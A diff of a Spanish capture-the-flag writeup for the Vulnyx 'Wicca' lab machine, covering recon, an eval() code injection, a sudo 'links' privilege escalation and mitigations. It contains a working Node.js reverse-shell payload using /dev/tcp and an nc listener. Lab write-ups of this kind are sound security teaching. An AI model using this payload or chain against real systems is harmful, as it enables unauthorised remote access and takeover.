@@ -1,6 +1,5 @@
 # Wicca | Vulnyx | Writeup
-
-> Writeup de la máquina **Wicca** de la plataforma **Vulnyx**, resuelta en un entorno de laboratorio **autorizado y controlado**. El objetivo es documentar el proceso completo de reconocimiento, explotación y escalada de privilegios con fines **estrictamente educativos**. Todas las pruebas se realizaron contra una máquina propia en una red aislada.
+> Laboratorio de pentesting en un entorno controlado. Este documento describe únicamente las pruebas realizadas sobre la máquina Wicca de VulNyx.
 
 ## Información del laboratorio
 
@@ -34,7 +33,7 @@
 
 ## 1. Reconocimiento de red
 
-Antes de atacar el objetivo, identifico mi propia configuración de red para conocer el segmento y la puerta de enlace.
+Antes de atacar el objetivo, se identifico la configuración de red para conocer el segmento y la puerta de enlace.
 
 ```bash
 ip -br addr
@@ -52,7 +51,7 @@ ip route
 
 *Puerta de enlace predeterminada: `192.168.0.1`.*
 
-Con el segmento identificado, realizo un **host discovery** con ARP (`-PR`) para listar los equipos activos sin tocar puertos todavía.
+Con el segmento identificado, se realizo un **host discovery** con ARP (`-PR`) para listar los equipos activos sin tocar puertos todavía.
 
 ```bash
 sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
@@ -60,9 +59,7 @@ sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
 
 <img width="546" height="423" alt="image" src="https://github.com/user-attachments/assets/f26891d7-9862-4379-be2f-b6e400a6ba13" />
 
-*8 hosts activos. El objetivo `192.168.0.17` se identifica por su MAC de VirtualBox (`08:00:27:...`).*
-
-Extraigo únicamente las IPs activas del `.gnmap` para trabajar más cómodo.
+*8 hosts activos. El objetivo `192.168.0.17` se identifica por su MAC de VirtualBox.*
 
 ```bash
 awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
@@ -78,7 +75,7 @@ awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
 
 ## 2. Escaneo del objetivo
 
-Ejecuto detección de sistema operativo sobre el objetivo.
+Se ejecuto la detección de sistema operativo.
 
 ```bash
 sudo nmap -O 192.168.0.17 -oA os-fingerprint-192.168.0.17
@@ -88,7 +85,7 @@ sudo nmap -O 192.168.0.17 -oA os-fingerprint-192.168.0.17
 
 *Puertos abiertos: `22/ssh`, `80/http`, `5000/upnp`. SO: Linux (familia Debian/4.x–5.x).*
 
-A continuación realizo detección de versiones sobre los puertos de interés.
+A continuación realizo detección de versiones sobre los puertos detectados.
 
 ```bash
 sudo nmap -sV -p 22,80,500 192.168.0.17 -oA service-detection-inicial-192.168.0.17
@@ -96,7 +93,7 @@ sudo nmap -sV -p 22,80,500 192.168.0.17 -oA service-detection-inicial-192.168.0.
 
 <img width="777" height="232" alt="Detección de servicios" src="https://github.com/user-attachments/assets/88e23221-8565-45a6-a655-b9f175e37b31" />
 
-*`22` → OpenSSH 9.2p1 Debian · `80` → Apache httpd 2.4.57 (Debian) · `500` cerrado. El servicio relevante vive en el `5000`.*
+*`22` → OpenSSH 9.2p1 Debian · `80` → Apache httpd 2.4.57 (Debian) · `500` cerrado.
 
 Enumero los métodos de autenticación admitidos por SSH.
 
@@ -122,7 +119,7 @@ nmap -p 22 --script ssh2-enum-algos 192.168.0.17
 
 ## 3. Enumeración del servicio web (puerto 80)
 
-Inspecciono las cabeceras HTTP del servidor Apache.
+Se inspeccionó las cabeceras HTTP del servidor Apache.
 
 ```bash
 curl -I http://192.168.0.17 | tee http-headers-inicial-192.168.0.17.txt
@@ -132,7 +129,7 @@ curl -I http://192.168.0.17 | tee http-headers-inicial-192.168.0.17.txt
 
 *`HTTP/1.1 200 OK` — Apache/2.4.57 (Debian), `Content-Type: text/html`.*
 
-Verifico la existencia de `robots.txt`.
+Se verificó la existencia de `robots.txt`.
 
 ```bash
 curl -i http://192.168.0.17/robots.txt | tee http-robots-inicial-192.168.0.17.txt
@@ -142,7 +139,7 @@ curl -i http://192.168.0.17/robots.txt | tee http-robots-inicial-192.168.0.17.tx
 
 *`404 Not Found` — no existe `robots.txt`.*
 
-Realizo fuzzing de directorios con Gobuster.
+Se realizó fuzzing de directorios con Gobuster.
 
 ```bash
 gobuster dir -u http://192.168.0.17 -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-common-192.168.0.17.txt
@@ -152,7 +149,7 @@ gobuster dir -u http://192.168.0.17 -w /usr/share/wordlists/dirb/common.txt -t 1
 
 *Se descubren `/images` (301), `/javascript` (301, luego 403) e `index.html`.*
 
-Inspecciono los directorios encontrados en el navegador.
+Se inspeccionaron los directorios encontrados en el navegador.
 
 <img width="582" height="226" alt="Inspección en navegador javascript http" src="https://github.com/user-attachments/assets/e981f6b9-5a4e-4993-a303-2d8783e43731" />
 
@@ -186,11 +183,11 @@ Al enviar un nombre, la URL incorpora dos parámetros (`name` y `token`) y la p�
 
 ## 5. Identificación de la vulnerabilidad
 
-Pruebo cómo se comporta cada parámetro. Primero modifico `name`.
+Se prueba cómo se comporta cada parámetro. Primero se modifica `name`.
 
 ![Cambio valor de name en URL y cambia solo el usuario](images/16-name-change.png)
 
-*Cambiar `name=test1` solo altera el usuario mostrado: `Welcome test1!`. Es una reflexión literal del valor.*
+*Cambiar `name=test1` solo altera el usuario mostrado: `Welcome test1!`. *
 
 Al cambiar `token` por un número, no se produce ningún cambio visible.
 
@@ -220,25 +217,25 @@ El stack trace es concluyente: el parámetro `token` se pasa directamente a **`e
 
 ## 6. Explotación — Reverse Shell
 
-Construyo un payload de reverse shell en Node.js usando `child_process`, apuntando a mi Kali (`192.168.0.13:4444`).
+Se construyó un payload de reverse shell en Node.js usando `child_process`, apuntando al Kali (`192.168.0.13:4444`).
 
 ```javascript
 require('child_process').exec('bash -c "bash -i >& /dev/tcp/192.168.0.13/4444 0>&1"')
 ```
 
-Como el payload viaja en un parámetro GET, lo codifico en **URL-encoded**.
+Como el payload viaja en un parámetro GET, se codificó en **URL-encoded**.
 
 <img width="793" height="473" alt="Se confirma ejecució nde Javascript del lado del servidor" src="https://github.com/user-attachments/assets/ab769a73-6870-4579-a719-c6c9bd1d1eef" />
 
 *Codificación del payload `child_process` a formato URL-encoded para inyectarlo en `token`.*
 
-Dejo un listener a la escucha en Kali:
+Se dejó  un listener a la escucha en Kali:
 
 ```bash
 nc -lvnp 4444
 ```
 
-E inyecto el payload codificado en el parámetro `token` desde el navegador:
+Se inyectó el payload codificado en el parámetro `token` desde el navegador:
 
 ```
 http://192.168.0.17:5000/?name=test&token=<payload-urlencoded>
@@ -254,7 +251,7 @@ http://192.168.0.17:5000/?name=test&token=<payload-urlencoded>
 
 ## 7. Flag de usuario
 
-Ya dentro del sistema, enumero el home del usuario comprometido.
+Ya dentro del sistema, se enumera el home del usuario comprometido.
 
 ```bash
 whoami
@@ -270,14 +267,14 @@ cat user.txt
 **Flag de usuario:**
 
 ```
-VulNyx{d9f213df08ea2b3bf6cc90be28fa827f}
+VulNyx{d9f213df08eaxxxxxxxxxx}
 ```
 
 ---
 
 ## 8. Escalada de privilegios
 
-Confirmo que con permisos bajos no puedo acceder al directorio de root.
+Se confirmó que con permisos bajos no es posible acceder al directorio de root.
 
 ```bash
 cd /root
@@ -287,7 +284,7 @@ cd /root
 
 *`cd: root: Permission denied`.*
 
-Enumero los permisos `sudo` del usuario.
+Se enumeraron los permisos `sudo` del usuario.
 
 ```bash
 sudo -l
@@ -365,14 +362,9 @@ GTFOBins: links → OS shell → ROOT → root.txt
 
 ## 11. Conclusión
 
-La máquina **Wicca** encadena dos fallos clásicos y evitables:
+La máquina **Wicca** encadena dos fallos:
 
 1. **Inyección de código en `eval()`**: la aplicación pasa entrada del usuario (`token`) directamente a `eval()` sin validación ni sanitización, permitiendo ejecución arbitraria de código del lado del servidor. La mitigación es simple: **nunca** pasar entrada no confiable a `eval()`; usar parsers seguros (`JSON.parse`, validación estricta de tipos) y aplicar el principio de mínima exposición.
 
 2. **Configuración sudo insegura**: otorgar `NOPASSWD` sobre binarios interactivos como `links` permite escapar a un shell con privilegios elevados (GTFOBins). La mitigación es restringir `sudo` a comandos no interactivos y revisar periódicamente las entradas en `/etc/sudoers`.
 
-El ejercicio refuerza la importancia de **validar cada paso con evidencia** y de entender *por qué* funciona cada técnica, no solo *cómo* ejecutarla.
-
----
-
-> ⚠️ **Disclaimer:** Todo el contenido de este writeup se realizó sobre una máquina de laboratorio **propia**, en un entorno **aislado y autorizado**, con fines **educativos y de investigación en seguridad ofensiva**. No debe aplicarse sobre sistemas sin autorización explícita.
